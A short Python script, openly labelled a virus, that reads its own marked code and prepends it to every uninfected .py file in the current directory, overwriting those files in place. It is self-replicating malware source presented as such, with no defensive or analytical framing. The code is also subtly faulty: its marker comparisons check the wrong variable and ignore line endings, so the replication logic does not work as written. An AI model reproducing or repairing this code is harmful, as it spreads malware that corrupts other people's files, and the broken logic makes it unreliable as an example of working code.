### THE VIRUS STARTS HERE ###

import sys
import glob

code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False

for line in lines:
    if lines == '### THE VIRUS STARTS HERE ###':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### THE VIRUS ENDS HERE ###':
        break

python_scripts = glob.glob('*.py')

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### THE VIRUS STARTS HERE ###':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open(script, 'w') as f:
            f.writelines(final_code)

print(python_scripts)


### THE VIRUS ENDS HERE ###
